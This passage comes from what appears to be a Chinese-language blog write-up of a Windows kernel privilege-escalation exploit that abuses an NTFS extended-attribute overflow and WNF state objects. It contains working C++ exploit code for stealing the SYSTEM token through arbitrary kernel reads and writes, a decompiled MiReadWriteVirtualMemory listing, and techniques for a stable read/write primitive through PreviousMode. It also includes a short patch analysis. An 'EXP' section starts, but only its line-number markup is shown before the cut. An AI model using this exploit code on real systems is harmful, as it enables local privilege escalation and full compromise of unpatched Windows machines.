PWNF_STATE_NAME pOverflowWNFState, PVOID pQueryBuffer, ULONG queryBufferSize, PipeHandles pipeHandles, PWNF_STATE_NAME pWriteStateName)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[+] changeToken&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br><span class="line"></span><br><span class="line">    UINT64 beginEprocess = eprocess;</span><br><span class="line">    UINT64 processId = <span class="number">0</span>;</span><br><span class="line">    UINT64 nextEprocess = <span class="number">0</span>;</span><br><span class="line">    UINT64 dwPID = <span class="built_in">GetCurrentProcessId</span>();</span><br><span class="line">    UINT64 currentEprocess = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        processId = <span class="built_in">arbRead64</span>(eprocess + PROCESS_ID_OFFSET, pOverflowWNFState, pQueryBuffer, pipeHandles);</span><br><span class="line">        <span class="keyword">if</span> (processId == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        nextEprocess = <span class="built_in">arbRead64</span>(eprocess + NEXT_EPROCESS_OFFSET, pOverflowWNFState, pQueryBuffer, pipeHandles) - NEXT_EPROCESS_OFFSET;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nextEprocess == beginEprocess) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (processId == dwPID) &#123;</span><br><span class="line">            currentEprocess = eprocess;</span><br><span class="line">        &#125;</span><br><span class="line">        eprocess = nextEprocess;</span><br><span class="line">    &#125;</span><br><span class="line">    UINT64 systemToken = <span class="built_in">arbRead64</span>(eprocess + TOKEN_OFFSET, pOverflowWNFState, pQueryBuffer, pipeHandles);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] systemToken : &quot;</span> &lt;&lt; std::hex &lt;&lt; systemToken &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] eprocess : &quot;</span> &lt;&lt; std::hex &lt;&lt; eprocess &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br><span class="line"></span><br><span class="line">    ULONG fakeTokenSize = (TOKEN_OFFSET + <span class="number">8</span>) - CREATE_TIME_OFFSET;</span><br><span class="line"></span><br><span class="line">    UINT64 writeAddr = currentEprocess + CREATE_TIME_OFFSET;</span><br><span class="line">    UINT64 originNameStatePtr = ((PUINT64)pQueryBuffer)[(allocSize + TOTAL_WNF_SIZE + <span class="number">0x68</span>) / <span class="number">0x8</span>];</span><br><span class="line"></span><br><span class="line">    PCHAR pFakeToken = (PCHAR)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, fakeTokenSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (pFakeToken == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to VirtualAlloc pFakeToken&quot;</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(pFakeToken, <span class="number">0</span>, fakeTokenSize);</span><br><span class="line">    <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; fakeTokenSize / <span class="number">0x8</span>; i++) &#123;</span><br><span class="line">        UINT64 tmpValue = <span class="built_in">arbRead64</span>(writeAddr + i * <span class="number">0x8</span>, pOverflowWNFState, pQueryBuffer, pipeHandles);</span><br><span class="line">        <span class="built_in">memcpy</span>(pFakeToken + i * <span class="number">0x8</span>, &amp;tmpValue, <span class="built_in">sizeof</span>(tmpValue));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(pFakeToken + TOKEN_OFFSET - CREATE_TIME_OFFSET, &amp;systemToken, <span class="built_in">sizeof</span>(systemToken));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">arbWrite</span>(writeAddr, pFakeToken, fakeTokenSize, pOverflowWNFState, pQueryBuffer, pWriteStateName);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">VirtualFree</span>(pFakeToken, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终效果：</p>
<p><img src="https://s2.loli.net/2022/05/04/15jzEHPJFIKm7q6.png" alt="Untitled 2.png"></p>
<h1 id="Patch分析"><a href="#Patch分析" class="headerlink" title="Patch分析"></a>Patch分析</h1><p><code>patch</code> 了 <code>NtfsQueryEaUserEaList</code> 中的比较，将 <code>padding</code> 变为加在 <code>ea_block_size</code> 上了。需要注意的是 <code>EaValueLength</code> 和 <code>EaNameLength</code> 都是小于两字节的，所以 <code>ea_block_size + padding</code> 是溢出不了的（否则可以溢出为 <code>0</code> 绕过判断），所以该 <code>patch</code> 没有任何问题。</p>
<p><img src="https://s2.loli.net/2022/05/04/ad7H6thXsWxlLOf.png" alt="Untitled 3.png"></p>
<h1 id="补充内容"><a href="#补充内容" class="headerlink" title="补充内容"></a>补充内容</h1><h2 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h2><p>实际上本文最终通过读取 <code>_WNF_NAME_INSTANCE</code>  中的 <code>CreatorProcess</code> 获取了 <code>eprocess</code> 的地址。这是一个不需要信息泄露的洞就可以得到 <code>System</code> 和本进程的 <code>token</code> 的方法。另外本文也泄露了内核基地址，不需要任何的信息泄露漏洞。</p>
<h2 id="恢复内核堆"><a href="#恢复内核堆" class="headerlink" title="恢复内核堆"></a>恢复内核堆</h2><p>由于我们改了 <code>_WNF_NAME_INSTANCE</code>  中的 <code>StateData</code> 来任意地址写，当程序结束的时候也会释放 <code>StateData</code> 所指向的堆块，如果我们不恢复它的话就会导致蓝屏，所以正常的流程还需要修复该值。</p>
<h2 id="稳定任意读写"><a href="#稳定任意读写" class="headerlink" title="稳定任意读写"></a>稳定任意读写</h2><p>通过有限制的任意地址读写，改写 <code>KTHREAD</code>  结构的 <code>PreviousMode</code> 为 <code>0</code> ，即可使用 <code>NtReadVirtualMemory</code>  和 <code>NtWriteVirtualMemory</code> 实现任意地址的读写。其判断逻辑如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">MiReadWriteVirtualMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        HANDLE Handle,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">size_t</span> BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">size_t</span> Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">size_t</span> NumberOfBytesToWrite,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 NumberOfBytesWritten,</span></span></span><br><span class="line"><span class="params"><span class="function">        ACCESS_MASK DesiredAccess)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// er13</span></span><br><span class="line">  __int64 v9; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_KTHREAD</span> *CurrentThread; <span class="comment">// r14</span></span><br><span class="line">  KPROCESSOR_MODE PreviousMode; <span class="comment">// al</span></span><br><span class="line">  _QWORD *v12; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v13; <span class="comment">// rcx</span></span><br><span class="line">  NTSTATUS v14; <span class="comment">// edi</span></span><br><span class="line">  _KPROCESS *Process; <span class="comment">// r10</span></span><br><span class="line">  PVOID v16; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// er9</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// er8</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// ecx</span></span><br><span class="line">  NTSTATUS v21; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// er10</span></span><br><span class="line">  <span class="type">char</span> v24; <span class="comment">// [rsp+40h] [rbp-48h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+48h] [rbp-40h] BYREF</span></span><br><span class="line">  PVOID Object[<span class="number">2</span>]; <span class="comment">// [rsp+50h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// [rsp+A0h] [rbp+18h]</span></span><br><span class="line"></span><br><span class="line">  v27 = Buffer;</span><br><span class="line">  v7 = BaseAddress;</span><br><span class="line">  v9 = <span class="number">0</span>i64;</span><br><span class="line">  Object[<span class="number">0</span>] = <span class="number">0</span>i64;</span><br><span class="line">  CurrentThread = <span class="built_in">KeGetCurrentThread</span>();</span><br><span class="line">  PreviousMode = CurrentThread-&gt;PreviousMode;</span><br><span class="line">  v24 = PreviousMode;</span><br><span class="line">  <span class="keyword">if</span> ( PreviousMode )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( NumberOfBytesToWrite + BaseAddress &lt; BaseAddress</span><br><span class="line">      || NumberOfBytesToWrite + BaseAddress &gt; <span class="number">0x7FFFFFFF0000</span>i64</span><br><span class="line">      || Buffer + NumberOfBytesToWrite &lt; Buffer</span><br><span class="line">      || Buffer + NumberOfBytesToWrite &gt; <span class="number">0x7FFFFFFF0000</span>i64 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">3221225477</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">    v12 = (_QWORD *)NumberOfBytesWritten;</span><br><span class="line">    <span class="keyword">if</span> ( NumberOfBytesWritten )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = NumberOfBytesWritten;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)NumberOfBytesWritten &gt;= <span class="number">0x7FFFFFFF0000</span>i64 )</span><br><span class="line">        v13 = <span class="number">0x7FFFFFFF0000</span>i64;</span><br><span class="line">      *(_QWORD *)v13 = *(_QWORD *)v13;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">	...</span><br><span class="line">	<span class="comment">// read adn write</span></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时如果使用了该方法，最后也需要恢复 <code>PreviousMode</code>  来进行清理。</p>
<blockquote>
<p>另外需要注意在 32 位下该方法是不能使用的，具体分析可以查看 <a target="_blank" rel="noopener" href="https://research.nccgroup.com/2020/05/25/cve-2018-8611-exploiting-windows-ktm-part-5-5-vulnerability-detection-and-a-better-read-write-primitive/">这篇文章</a></p>
</blockquote>
<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span 